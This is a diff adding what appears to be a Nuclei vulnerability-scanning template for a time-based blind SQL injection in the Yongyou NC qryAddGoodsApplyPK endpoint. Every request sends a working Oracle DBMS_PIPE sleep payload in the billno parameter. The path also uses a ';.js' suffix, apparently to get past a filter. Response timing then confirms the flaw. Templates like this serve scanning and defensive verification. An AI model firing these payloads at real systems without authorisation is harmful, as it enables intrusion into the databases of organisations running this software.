@@ -1,0 +1,50 @@
+id: yongyou-nc-qryAddGoodsApplyPK-sqli
+
+info:
+  name: yongyou-nc-qryAddGoodsApplyPK-sqli
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        GET /ebvp/other/qryAddGoodsApplyPK;.js?billno=1'+AND+7554%3dDBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(87)||CHR(74)||CHR(112),0)+AND+'ldrk'%3d'ldrk HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
+        Accept-Encoding: identity
+        Connection: close
+        Content-Type: text/xml; charset=utf-8
+
+      - |
+        GET /ebvp/other/qryAddGoodsApplyPK;.js?billno=1'+AND+7554%3dDBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(87)||CHR(74)||CHR(112),2)+AND+'ldrk'%3d'ldrk HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
+        Accept-Encoding: identity
+        Connection: close
+        Content-Type: text/xml; charset=utf-8
+
+
+      - |
+        GET /ebvp/other/qryAddGoodsApplyPK;.js?billno=1'+AND+7554%3dDBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(87)||CHR(74)||CHR(112),4)+AND+'ldrk'%3d'ldrk HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
+        Accept-Encoding: identity
+        Connection: close
+        Content-Type: text/xml; charset=utf-8
+
+
+
+    stop-at-first-match: true
+    max-size: 100
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=0  && duration_1<=2"
+          - "duration_2>=2  && duration_2<=4"
+          - "duration_3>=4  && duration_3<=6"
+
+
+
